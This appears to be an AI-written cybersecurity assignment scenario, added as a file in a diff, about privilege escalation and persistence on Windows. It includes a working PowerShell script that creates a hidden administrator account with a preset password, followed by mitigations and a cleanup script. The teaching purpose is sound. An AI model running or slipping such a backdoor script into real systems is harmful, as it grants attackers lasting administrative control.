@@ -1,0 +1,104 @@
+Here’s a feasible real-world example of a scenario you can use for your CERT-4 cybersecurity assignment. This scenario demonstrates how a script could be exploited to escalate privileges and maintain persistence, which is a common tactic used by attackers.
+
+Assignment Scenario: Exploiting Privilege Escalation and Persistence
+
+Objective:
+
+The goal of this assignment is to understand how attackers can exploit scripts with administrative functions to escalate privileges and maintain persistence on a compromised system. You will simulate an attack where a PowerShell script is used to add a backdoor user to the Administrators group, enabling ongoing control of the system.
+
+Scenario Description:
+
+Imagine you are working in an organization’s IT security team. During routine monitoring, you notice a suspicious script. This script appears to be a system maintenance tool but has the capability to modify user groups and execute programs with admin privileges.
+
+Upon further investigation, you realize that the script could be weaponized by attackers to escalate privileges and maintain control over the system. The script is disguised as a legitimate tool, but its hidden functionality could allow an attacker to create a persistent backdoor user.
+
+You need to analyze the script, identify the potential security risk, and implement countermeasures to prevent this type of attack.
+
+Steps:
+
+	1.	Analyze the Suspicious Script:
+The following PowerShell script is identified in the system. It looks legitimate but has hidden functionality that could be exploited:
+
+function Add-BackdoorUser {
+    param (
+        [string]$username = "backdoorUser",
+        [string]$password = "P@ssword123"
+    )
+
+    # Check if the user already exists
+    $user = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
+    if (-not $user) {
+        # Create a new local user with the specified password
+        New-LocalUser -Name $username -Password (ConvertTo-SecureString $password -AsPlainText -Force) -FullName "System Maintenance" -Description "Hidden backdoor user" -ErrorAction Stop
+    }
+
+    # Add the user to the Administrators group
+    Add-LocalGroupMember -Group "Administrators" -Member $username
+
+    Write-Output "Backdoor user '$username' added to Administrators group."
+}
+
+# Example usage
+Add-BackdoorUser -username "backdoorUser" -password "P@ssword123"
+
+
+	2.	Identify the Risk:
+      •   This script can create a new local user called backdoorUser with a preset password.
+      •   It then adds the new user to the local Administrators group, granting full control over the system.
+      •   The user account is hidden under a generic name “System Maintenance” to avoid detection.
+	3.	Demonstrate the Exploit:
+      •   On a test system, run the script to see how it creates the backdoor user.
+      •   Verify that the user backdoorUser has been added to the Administrators group by running:
+
+Get-LocalGroupMember -Group "Administrators"
+
+
+      •   The user backdoorUser should now appear in the list, showing how an attacker could maintain persistent administrative access to the system.
+
+	4.	Mitigation Strategies:
+      •   Least Privilege: Ensure that scripts like this are executed with the least amount of privilege necessary. Regular users should not have permission to create new users or modify groups.
+      •   Audit and Monitoring: Set up auditing for user creation and changes to the Administrators group. Any unexpected changes should trigger an alert for the security team to investigate.
+      •   Remove Unnecessary Scripts: Regularly review scripts on the system, especially those with administrative capabilities, and remove any that are unnecessary or suspicious.
+	5.	Countermeasure Example:
+Create a new PowerShell script to detect and remove unauthorized users from the Administrators group:
+
+function Remove-UnauthorizedAdmin {
+    param (
+        [string[]]$allowedAdmins = @("Administrator", "ITAdmin")
+    )
+
+    # Get current members of the Administrators group
+    $adminGroup = Get-LocalGroupMember -Group "Administrators"
+
+    foreach ($member in $adminGroup) {
+        if ($allowedAdmins -notcontains $member.Name) {
+            # Remove unauthorized admin users
+            Remove-LocalGroupMember -Group "Administrators" -Member $member.Name
+            Write-Output "Unauthorized admin user '$($member.Name)' removed from Administrators group."
+        }
+    }
+}
+
+# Example usage
+Remove-UnauthorizedAdmin
+
+      •   This script checks the Administrators group for any users not on the allowed list (e.g., only Administrator and ITAdmin are allowed) and removes any unauthorized users.
+      •   You can schedule this script to run regularly as part of your organization’s security maintenance.
+
+	6.	Conclusion:
+The assignment demonstrates how seemingly legitimate scripts can be used for malicious purposes, such as creating backdoor accounts and escalating privileges. By analyzing and understanding the risk, cybersecurity professionals can implement proper mitigations to prevent exploitation.
+
+Real-World Relevance:
+
+This scenario mimics real-world cyber-attacks where attackers leverage legitimate tools to escalate privileges and maintain persistence within a compromised system. Understanding these tactics is essential for cybersecurity professionals tasked with defending against such threats.
+
+Deliverables:
+
+For your assignment, you should include:
+
+   •   An analysis of the script and the risk it poses.
+   •   A demonstration of how the backdoor user can be added and the risk exploited.
+   •   A description of mitigation strategies, including code samples for detecting and removing unauthorized users.
+   •   A discussion of how this scenario applies to real-world cybersecurity incidents.
+
+This scenario would demonstrate a strong understanding of privilege escalation, persistence, and mitigation techniques, making it a valuable and practical assignment in cybersecurity.
